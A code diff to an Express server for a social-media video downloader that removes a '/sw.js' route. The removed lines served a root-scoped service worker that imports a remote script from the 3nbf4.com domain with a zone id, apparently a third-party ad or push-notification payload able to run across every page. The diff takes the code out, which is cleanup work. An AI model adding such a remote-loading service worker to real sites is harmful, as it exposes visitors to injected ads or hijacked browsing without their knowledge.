@@ -1,32 +1,16 @@
 const express = require('express');
 const http = require('http');
 const https = require('https');
-const fs = require('fs');
 const path = require('path');
 const { downloadTikTok } = require('./src/services/tiktok');
 const { downloadInstagram } = require('./src/services/instagram');
 const { downloadVideo } = require('./src/services/video');
-
-const SW_SCRIPT = `self.options = {
-    "domain": "3nbf4.com",
-    "zoneId": 11934155
-}
-self.lary = ""
-importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')
-`;
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
-
-app.get('/sw.js', (req, res) => {
-  res.setHeader('Content-Type', 'application/javascript; charset=UTF-8');
-  res.setHeader('Service-Worker-Allowed', '/');
-  res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
-  res.status(200).send(SW_SCRIPT);
-});
 
 app.use(express.static(path.join(__dirname, 'public')));
 
